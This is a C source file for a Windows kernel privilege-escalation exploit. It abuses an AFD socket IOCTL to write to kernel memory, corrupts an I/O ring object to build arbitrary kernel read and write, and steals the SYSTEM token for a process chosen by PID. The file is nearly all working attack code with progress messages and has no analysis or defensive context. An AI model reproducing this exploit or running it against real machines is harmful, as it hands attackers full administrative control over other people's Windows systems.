#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <ntstatus.h>
#define WIN32_NO_STATUS
#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#include <ioringapi.h>
#include <intrin.h>
#include "header.h"

DWORD(WINAPI* _NtCreateFile)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
DWORD(WINAPI* _NtSetIoCompletion)(HANDLE IoCompletionHandle, ULONG CompletionKey, PIO_STATUS_BLOCK IoStatusBlock, NTSTATUS CompletionStatus, ULONG NumberOfBytesTransferred);
DWORD(WINAPI* _NtDeviceIoControlFile)(HANDLE FileHandle, HANDLE Event, VOID* ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, ULONG IoControlCode, PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer, ULONG OutputBufferLength);
DWORD(WINAPI* _NtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
DWORD(WINAPI* _NtCreateIoCompletion)(PHANDLE IoCompletionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, ULONG NumberOfConcurrentThreads);

typedef struct AFD_NOTIFYSOCK_DATA1
{
    HANDLE hCompletion;
    PVOID pData1;
    PVOID pData2;
    PVOID pPwnPtr;
    DWORD dwCounter;
    DWORD dwTimeout;
    DWORD dwLen;
    char lol[0x4];
}AFD_NOTIFYSOCK_DATA1;

int getNtFunctionAddr(void) {
    int ret = -1;
    
    _NtCreateFile = (unsigned long(__stdcall*)(PHANDLE, unsigned long, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, unsigned long, unsigned long, unsigned long, unsigned long, void*, unsigned long))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateFile");
    _NtCreateIoCompletion = (unsigned long(__stdcall*)(PHANDLE, ACCESS_MASK, PVOID, ULONG))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateIoCompletion");
    _NtSetIoCompletion = (unsigned long(__stdcall*)(HANDLE, ULONG, PIO_STATUS_BLOCK, NTSTATUS, ULONG))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetIoCompletion");
    _NtDeviceIoControlFile = (unsigned long(__stdcall*)(HANDLE, void*, void*, void*, PIO_STATUS_BLOCK, unsigned long, void*, unsigned long, void*, unsigned long))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDeviceIoControlFile");
    _NtQuerySystemInformation = (unsigned long(__stdcall*)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
  

    if ((_NtCreateIoCompletion != 0) && (_NtSetIoCompletion != 0)) {
        printf(" [+] Get Nt Function Address success\n");
        ret = 0;
        return ret;
    }
    else
    {
        printf(" [-] Get Nt Function Address failed\n");
        ret = GetLastError();
        return ret;
    }
}
PIORING_OBJECT ioringAddress;
HIORING hIoring = 0;
int ArbitraryKernelWrite0x1(void* pWriteAddr) {
   
    int ret = -1;
    HANDLE hCompletion = INVALID_HANDLE_VALUE;
    IO_STATUS_BLOCK IoStatusBlock = { 0 };
    HANDLE hSocket = INVALID_HANDLE_VALUE;
    UNICODE_STRING ObjectFilePath = { 0 };
    OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
    AFD_NOTIFYSOCK_DATA1 Data = { 0 };
    HANDLE hEvent = NULL;
    HANDLE hThread = NULL;

    // Hard-coded attributes for an IPv4 TCP socket
    BYTE bExtendedAttributes[] =
    {
        0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x1E, 0x00, 0x41, 0x66, 0x64, 0x4F, 0x70, 0x65, 0x6E, 0x50,
        0x61, 0x63, 0x6B, 0x65, 0x74, 0x58, 0x58, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x02, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x60, 0xEF, 0x3D, 0x47, 0xFE
    };

    ret = _NtCreateIoCompletion(&hCompletion, MAXIMUM_ALLOWED, NULL, 1);

    if (0 != ret)
    {
        goto done;
    }

    ret = _NtSetIoCompletion(hCompletion, 0x1337, &IoStatusBlock, 0, 0x100);

    if (0 != ret)
    {
        goto done;
    }

    ObjectFilePath.Buffer = (PWSTR)L"\\Device\\Afd\\Endpoint";
    ObjectFilePath.Length = (USHORT)wcslen(ObjectFilePath.Buffer) * sizeof(wchar_t);
    ObjectFilePath.MaximumLength = ObjectFilePath.Length;

    ObjectAttributes.Length = sizeof(ObjectAttributes);
    ObjectAttributes.ObjectName = &ObjectFilePath;
    ObjectAttributes.Attributes = 0x40;

    ret = _NtCreateFile(&hSocket, MAXIMUM_ALLOWED, &ObjectAttributes, &IoStatusBlock, NULL, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, 1, 0, bExtendedAttributes, sizeof(bExtendedAttributes));

    if (0 != ret)
    {
        goto done;
    }

    Data.hCompletion = hCompletion;
    Data.pData1 = VirtualAlloc(NULL, 0x2000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    Data.pData2 = VirtualAlloc(NULL, 0x2000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    Data.dwCounter = 0x1;
    Data.dwLen = 0x1;
    Data.dwTimeout = 100000000;
    Data.pPwnPtr = pWriteAddr;

    if ((NULL == Data.pData1) || (NULL == Data.pData2))
    {
        ret = GetLastError();
        goto done;
    }

    hEvent = CreateEvent(NULL, 0, 0, NULL);

    if (NULL == hEvent)
    {
        ret = GetLastError();
        goto done;
    }

    _NtDeviceIoControlFile(hSocket, hEvent, NULL, NULL, &IoStatusBlock, 0x12127, &Data, 0x30, NULL, 0);

    ret = 0;

done:
    if (INVALID_HANDLE_VALUE != hCompletion)
    {
        CloseHandle(hCompletion);
    }

    if (INVALID_HANDLE_VALUE != hSocket)
    {
        CloseHandle(hSocket);
    }

    if (NULL != hEvent)
    {
        CloseHandle(hEvent);
    }

    if (NULL != Data.pData1)
    {
        VirtualFree(Data.pData1, 0, MEM_RELEASE);
    }

    if (NULL != Data.pData2)
    {
        VirtualFree(Data.pData2, 0, MEM_RELEASE);
    }

    return ret;
}


HRESULT QueryIoringObject(_In_ HANDLE Handle, _Out_ PVOID* ObjectAddress)
{
    NTSTATUS status;
    HRESULT hResult;
    ULONG bytes;
    ULONG i;
    ULONG ioringTypeIndex;
    SYSTEM_HANDLE_INFORMATION localInfo;
    PSYSTEM_HANDLE_INFORMATION handleInfo = &localInfo;
    struct
    {
        OBJECT_TYPE_INFORMATION TypeInfo;
        WCHAR TypeNameBuffer[sizeof("IoRing")];
    } typeInfoWithName;

    hResult = S_OK;
    *ObjectAddress = 0;

    status = NtQueryObject(Handle,
        ObjectTypeInformation,
        &typeInfoWithName,
        sizeof(typeInfoWithName),
        NULL);
    if (!NT_SUCCESS(status))
    {
        printf(" [-] NtQueryObject failed: 0x%x\n", status);
        hResult = HRESULT_FROM_NT(status);
        goto Failure;
    }
    ioringTypeIndex = typeInfoWithName.TypeInfo.TypeIndex;

    status = NtQuerySystemInformation(SystemHandleInformation,
        handleInfo,
        sizeof(*handleInfo),
        &bytes);
    if (NT_SUCCESS(status))
    {
        printf(" [-] NtQuerySystemInformation failed: 0x%x\n", status);
        hResult = ERROR_UNIDENTIFIED_ERROR;
        goto Failure;
    }

    //
    // Add space for 100 more handles and try again
    //
    bytes += 100 * sizeof(*handleInfo);
    handleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        bytes);
    status = NtQuerySystemInformation(SystemHandleInformation,
        handleInfo,
        bytes,
        &bytes);
    if (!NT_SUCCESS(status) || !handleInfo)
    {
        hResult = HRESULT_FROM_NT(status);
        printf(" [-] NtQuerySystemInformation #2 failed: 0x%x\n", status);
        goto Failure;
    }

    //
    // Enumerate each one
    //
    for (i = 0; i < handleInfo->NumberOfHandles; i++)
    {
        //
        // Check if this is the correct I/O ring handle
        //
        if ((handleInfo->Handles[i].ObjectTypeIndex == ioringTypeIndex) &&
            (handleInfo->Handles[i].UniqueProcessId == GetCurrentProcessId()) &&
            ((HANDLE)handleInfo->Handles[i].HandleValue == Handle))
        {
            printf(" [+] Found I/O ring address: 0x%p\n", handleInfo->Handles[i].Object);
            *ObjectAddress = handleInfo->Handles[i].Object;
            break;
        }
    }

Failure:
    //
    // Free the handle list if we had one
    //
    if (handleInfo != &localInfo)
    {
        HeapFree(GetProcessHeap(), 0, handleInfo);
    }
    return hResult;
}

int createPipe() {

    int ret = -1;
    inputPipe = CreateNamedPipe(INPUT_PIPE_NAME, PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x1000, 0x1000, 0, NULL);
    if (inputPipe == INVALID_HANDLE_VALUE)
    {
        printf(" [-] Failed to create input pipe\n");
        ret = GetLastError();
        return ret;
    }
	else
		printf(" [+] Create input pipe success\n");
    outputPipe = CreateNamedPipe(OUTPUT_PIPE_NAME, PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x1000, 0x1000, 0, NULL);
    if (outputPipe == INVALID_HANDLE_VALUE)
    {
        printf(" [-] Failed to create output pipe: 0x%x\n", GetLastError());
        ret = GetLastError();
        return ret;
    }

    outputClientPipe = CreateFile(OUTPUT_PIPE_NAME,
                                  GENERIC_READ | GENERIC_WRITE,
                                  FILE_SHARE_READ | FILE_SHARE_WRITE,
                                  NULL,
                                  OPEN_ALWAYS,
                                  FILE_ATTRIBUTE_NORMAL,
                                  NULL);
    if (outputClientPipe == INVALID_HANDLE_VALUE)
    {
		printf(" [-] Failed to create output client pipe: 0x%x\n", GetLastError());
		ret = GetLastError();
		return ret;
	}
	else
		printf(" [+] Create output client pipe success\n");
    inputClientPipe = CreateFile(INPUT_PIPE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    ret = 0;
    return ret;
}

int createIOring(PIORING_OBJECT* ioringAddress) {
    IORING_CREATE_FLAGS flags = { 0 };
    flags.Required = IORING_CREATE_REQUIRED_FLAGS_NONE;
    flags.Advisory = IORING_CREATE_ADVISORY_FLAGS_NONE;
    int result = CreateIoRing(IORING_VERSION_3, flags, 0x10000, 0x20000, &hIoring);
    if (!SUCCEEDED(result))
    {
        printf(" [-] Failed creating IO ring handle: 0x%x\n", result);
        return result;
    }
    result = QueryIoringObject(*(PHANDLE)(hIoring), (PVOID*)ioringAddress);
    if (!SUCCEEDED(result))
    {
        printf(" [-] Failed finding I/O ring object address: 0x%x\n", result);
        return result;
    }
    return result;
}

PVOID AllocateFakeBuffersArray(
    _In_ ULONG NumberOfFakeBuffers,
    _In_opt_ PVOID AddressForArray
)
{
    ULONG size;
    PVOID fakeBuffers = 0;

    size = sizeof(ULONG64) * NumberOfFakeBuffers;
    fakeBuffers = (PULONG64)VirtualAlloc(AddressForArray,
        size,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE);
    if (fakeBuffers != NULL)
    {
        memset(fakeBuffers, 0, size);
    }
    return fakeBuffers;
}


int getobjptr(PULONG64 ppObjAddr, ULONG ulPid, HANDLE handle)
{
    int ret = -1;
    PSYSTEM_HANDLE_INFORMATION pHandleInfo = NULL;
    ULONG ulBytes = 0;
    NTSTATUS ntStatus = STATUS_SUCCESS;

    while ((ntStatus = _NtQuerySystemInformation(SystemHandleInformation, pHandleInfo, ulBytes, &ulBytes)) == STATUS_INFO_LENGTH_MISMATCH)
    {
        if (pHandleInfo != NULL)
        {
            pHandleInfo = HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pHandleInfo, 2 * ulBytes);
        }

        else
        {
            pHandleInfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2 * ulBytes);
        }
    }

    if (ntStatus != STATUS_SUCCESS)
    {
        ret = ntStatus;
        goto done;
    }

    for (ULONG i = 0; i < pHandleInfo->NumberOfHandles; i++)
    {
        if ((pHandleInfo->Handles[i].UniqueProcessId == ulPid) && (pHandleInfo->Handles[i].HandleValue == handle))
        {
            *ppObjAddr = pHandleInfo->Handles[i].Object;
            ret = 0;
            break;
        }
    }

done:
    if (NULL != pHandleInfo)
    {
        HeapFree(GetProcessHeap, 0, pHandleInfo);
    }
    return ret;
}

int ioring_read(PULONG64 pRegisterBuffer, ULONG64 pReadAddr, PVOID pReadBuffer, ULONG ulReadLen) {
    int ret = -1;
    PIOP_MC_BUFFER_ENTRY pMcBufferEntry = NULL;
    IORING_HANDLE_REF reqFile = IoRingHandleRefFromHandle(outputClientPipe);
    IORING_BUFFER_REF reqBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
    IORING_CQE cqe = { 0 };
    pMcBufferEntry = VirtualAlloc(NULL, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT, PAGE_READWRITE);
    if (NULL == pMcBufferEntry)
    {
        ret = GetLastError();
        goto done;
    }

    pMcBufferEntry->Address = pReadAddr;
    pMcBufferEntry->Length = ulReadLen;
    pMcBufferEntry->Type = 0xc02;
    pMcBufferEntry->Size = 0x80;
    pMcBufferEntry->AccessMode = 1;
    pMcBufferEntry->ReferenceCount = 1;

    pRegisterBuffer[0] = pMcBufferEntry;

    ret = BuildIoRingWriteFile(hIoring, reqFile, reqBuffer, ulReadLen, 0, FILE_WRITE_FLAGS_NONE, NULL, IOSQE_FLAGS_NONE);
    if (0 != ret)
    {
        goto done;
    }

    ret = SubmitIoRing(hIoring, 0, 0, NULL);

    if (0 != ret)
    {
        goto done;
    }

    ret = PopIoRingCompletion(hIoring, &cqe);

    if (0 != ret)
    {
        goto done;
    }

    if (0 != cqe.ResultCode)
    {
        ret = cqe.ResultCode;
        goto done;
    }
    if (0 == ReadFile(outputPipe, pReadBuffer, ulReadLen, NULL, NULL))
    {
        ret = GetLastError();
        goto done;
    }

    ret = 0;

done:
    if (NULL != pMcBufferEntry)
    {
        VirtualFree(pMcBufferEntry, sizeof(IOP_MC_BUFFER_ENTRY), MEM_RELEASE);
    }
    return ret;
}

int ioring_write(PULONG64 pRegisterBuffers, ULONG64 pWriteAddr, PVOID pWriteBuffer, ULONG ulWriteLen)
{
    int ret = -1;
    PIOP_MC_BUFFER_ENTRY pMcBufferEntry = NULL;
    IORING_HANDLE_REF reqFile = IoRingHandleRefFromHandle(inputClientPipe);
    IORING_BUFFER_REF reqBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
    IORING_CQE cqe = { 0 };

    if (0 == WriteFile(inputPipe, pWriteBuffer, ulWriteLen, NULL, NULL))
    {
        ret = GetLastError();
        goto done;
    }

    pMcBufferEntry = VirtualAlloc(NULL, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT, PAGE_READWRITE);

    if (NULL == pMcBufferEntry)
    {
        ret = GetLastError();
        goto done;
    }

    pMcBufferEntry->Address = pWriteAddr;
    pMcBufferEntry->Length = ulWriteLen;
    pMcBufferEntry->Type = 0xc02;
    pMcBufferEntry->Size = 0x80;
    pMcBufferEntry->AccessMode = 1;
    pMcBufferEntry->ReferenceCount = 1;

    pRegisterBuffers[0] = pMcBufferEntry;

    ret = BuildIoRingReadFile(hIoring, reqFile, reqBuffer, ulWriteLen, 0, NULL, IOSQE_FLAGS_NONE);

    if (0 != ret)
    {
        goto done;
    }

    ret = SubmitIoRing(hIoring, 0, 0, NULL);

    if (0 != ret)
    {
        goto done;
    }

    ret = PopIoRingCompletion(hIoring, &cqe);

    if (0 != ret)
    {
        goto done;
    }

    if (0 != cqe.ResultCode)
    {
        ret = cqe.ResultCode;
        goto done;
    }

    ret = 0;

done:
    if (NULL != pMcBufferEntry)
    {
        VirtualFree(pMcBufferEntry, sizeof(IOP_MC_BUFFER_ENTRY), MEM_RELEASE);
    }
    return ret;
}


int main(int argc, char* argv[]) {
    int ret = -1;
    ULONG pid = 0;
    if (argc != 2)
    {
        printf("usage:\nexp.exe <pid>\n");
        goto done;
    }
    
    pid = strtol(argv[1], NULL, 10);

    printf(" [!] Attempting to elevate pid %i\n", pid);

    if (getNtFunctionAddr() != 0) {
        printf(" [-] Failed to get NtFunctionAddr\n");
        return -1;
    }

    // create pipe and Open client handles
    createPipe(&inputPipe, &outputPipe, &outputClientPipe, &inputClientPipe);

    //Create an I/O ring


    createIOring(&ioringAddress, &hIoring);

    //// alloc fake buffer 
    PVOID pFakeBuffers = AllocateFakeBuffersArray(1,0x1000000);

    // find address of new IO ring object (already done in createIOring function)


    // find system token address 

    ULONG64 ullSystemEPROCaddr = 0;
    ULONG64 ullTargEPROCaddr = 0;
    ULONG64 ullSystemToken = 0;
    HANDLE hProc = NULL;
    hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (hProc == NULL) {
		printf(" [-] Failed to open process: %d\n", GetLastError());
		return -1;
	}

    
    ret = getobjptr(&ullSystemEPROCaddr, 4, 4);

    if (0 != ret)
    {
        goto done;
    }

    printf(" [+] System EPROC address: %llx\n", ullSystemEPROCaddr);
    
    ret = getobjptr(&ullTargEPROCaddr, GetCurrentProcessId(), hProc);

    if (0 != ret)
    {
        goto done;
    }

    printf(" [+] Target process EPROC address: %llx\n", ullTargEPROCaddr);
    

    //overwrite IoRing->RegBuffers with the address of the fake user-mode array
    ret = ArbitraryKernelWrite0x1((char*)&ioringAddress->RegBuffers + 0x3);
    if (ret != 0) {
        printf(" [-] IoRing->RegBuffers overwrite failed: %0x\n", ret);
        return -1;
    }
    printf(" [+] IoRing->RegBuffers overwritten with address 0x1000000\n");

    //write IoRing->RegBuffersCount to have a non-zero value

    ret = ArbitraryKernelWrite0x1((char*)&ioringAddress->RegBuffersCount);
    if (ret != 0) {
        printf(" [-] IoRing->RegBuffersCount overwrite failed: %0x\n", ret);
        return -1;
    }
    printf(" [+] IoRing->RegBuffersCount overwritten with value 0x1\n");
    
    //Populate the fake buffers array
    _HIORING * phIoRing = NULL;
    phIoRing = *(_HIORING**)&hIoring;
    phIoRing->RegBufferArray = pFakeBuffers;
    phIoRing->BufferArraySize = 1;


    // Queue read and write operations in the I/O ring through BuildIoRingReadFile and BuildIoRingWriteFile

    //read from ullSystemEPROCaddr + 0x4b8 and write it to &ullSystemToken
    ret = ioring_write(pFakeBuffers, ullTargEPROCaddr + 0x4b8, &ullSystemToken, sizeof(ULONG64));
    ret = ioring_read(pFakeBuffers, ullSystemEPROCaddr + 0x4b8, &ullSystemToken, sizeof(ULONG64));

    if (0 != ret)
    {
        goto done;
    }

    printf(" [+] System token is at: %llx\n", ullSystemToken);

    //write ullSystemToken to ullTargEPROCaddr + EPROC_TOKEN_OFFSET
    ret = ioring_write(pFakeBuffers, ullTargEPROCaddr + 0x4b8, &ullSystemToken, sizeof(ULONG64));

    //
    if (0 != ret)
    {
        goto done;
    }
    char null[0x10] = { 0 };
    // clean up
    ioring_write(pFakeBuffers, &ioringAddress->RegBuffersCount, &null , 0x10);


    printf(" [+] Target process token elevated to SYSTEM!\n");


done:

    return 0;
}